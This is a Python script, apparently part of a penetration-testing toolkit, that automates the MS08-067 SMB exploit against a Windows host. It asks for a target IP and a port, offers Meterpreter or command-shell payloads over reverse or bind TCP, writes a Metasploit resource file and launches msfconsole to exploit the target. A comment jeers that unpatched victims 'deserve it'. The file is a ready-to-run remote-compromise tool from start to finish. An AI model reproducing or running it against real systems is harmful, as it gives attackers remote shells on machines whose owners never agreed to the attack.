#!/usr/bin/python
#
# launch ms08_067 exploit
#

import os
import subprocess
from src import menus
from src.main import *
from time import sleep

path = msfpath()

while 1:
	try:
		# select payload
		selection = 0
		while selection != range(1,4):
			clear()
			menus.ms08_067_title()
			target = raw_input("Enter target IP: ")
			port = raw_input("Enter port for reverse connection: ")
			sleep(1)
			menus.ms08_067_menu()
			selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
			if selection == '1':
				payload = "windows/meterpreter/reverse_tcp"
				break
			if selection == '2':
				payload = "windows/shell/reverse_tcp"
				break
			if selection == '3':
				payload = "windows/meterpreter/bind_tcp"
				break
			if selection == '4':
				payload = "windows/shell/bind_tcp"
				break

		# create rc file
		rcfile = "/tmp/exploit_ms08067.rc"
		fw = open(rcfile, "w")
		fw.write("use exploit/windows/smb/ms08_067_netapi\n")
		fw.write("set RHOST %s\n" % target)
		fw.write("set PAYLOAD %s\n" % payload)
		fw.write("set LHOST 0.0.0.0\n")
		fw.write("set LPORT %s\n" % port)
		fw.write("set ExitOnSession false\n")

		# remove migrate for shell
		if not selection or selection in ('1','3'):
			fw.write("set AutoRunScript migrate -f\n")

		fw.write("exploit -j -z")
		fw.close()

		# exploit the target
		# they deserve it for not patching this!!!
		PrintInfo("Exploiting target, please wait.")
		subprocess.Popen("%s/msfconsole -r %s" % (path, rcfile), shell=True).wait()

		# clean up
		PrintInfo("Cleaning up...")
		os.remove(rcfile)
		sleep(1)
		#PGExit()
		break
	except KeyboardInterrupt:
		break
